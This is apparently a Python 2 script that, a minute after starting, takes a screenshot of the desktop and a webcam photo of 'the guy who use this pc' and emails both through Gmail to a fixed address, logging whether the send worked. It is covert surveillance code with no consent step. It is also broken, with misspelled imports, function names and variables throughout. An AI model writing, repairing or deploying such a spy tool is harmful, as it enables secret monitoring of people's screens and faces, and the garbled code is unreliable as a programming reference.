#-*-coding=utf-8-*-
import time
from VideoCapture import Device
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import stmplib
from PIL import ImageGrab
import os

def get_currecttime():
	'''get currect time'''
	open_time=time.strftime('%m%d%H%M',time.localtime(time.time()))
	return open_time

def get_desktopimg(correcttime):
	'''get desktop photo and save'''
	filename=r'F:/desktop' + correcttime + '.jpg'
	pic=ImageGrab.grab()
	pic.save(filename)
	return filename

def get_webcamimg(correcttime):
	'''get camera photo and save'''
	filename=r'F:/webcam' + correcttime + '.jpg'
	cam=Device()
	cam.saveSnapShot(filename,timestamp=3,boldfont=1,quality=75)
	return filename

def send_img(desktop,webcam):
	'''send the photos to gmail'''
	try:
		from_mail='****@gmail.com'
		to_mail='****@gmail.com'
		msg=MIMEMultipart()
		msg['From']=from_mail
		body='test img send'
		html_code='<b><i>the guy who use this pc.</i></b>'
		print html_code
		con=MIMEText(html_code,'html','utf-8')
		msg.attach(con)
		img1=MIMEImage(file(desktop,'rb').read())
		img2=MIMEImage(file(webcom,'rb').read())
		img1.add_header('Content-ID','<image1>')
		img2.add_header('Content-ID','<image2>')
		msg.attach(img1)
		msg.attach(img2)
		server=smtplib.SMTP('smtp.gmail.com')
		server.docmd('ehol',from_mail)
		server.starttls()
		server.login(from_mail,'password')
		server.senfmail(from_mail,to_mail,msg.as_string())
		server.quit()
		return True
	except:
		return False

def write_log(issuccess):
	'''write info in to log'''
	log_file_dir=r'F:/computer.log'
	log_file=file(log_file_dit,'a')
	log.file.write('at' + now_time + ' img saved success!')
	if issuccess:
		log_file.write('mail send success!!!!')
	else:
		log_file.write('mail send failed......')
	log_file.write('\n')
	log_file.close()

time.sleep(60)
now_time=get_correcttime()
desktopimg=get_desktopimg(now_time)
webcamimg=get_webcamimg(now_time)

'''check whether the photos saved success.'''
if os.path.isfile(desktopimg) and os.path.isfile(webcamimg):
	MailIsSend=send_img(desktopimg,webcamimg)
	write_log(MailIsSend)
else:
	exit(1)
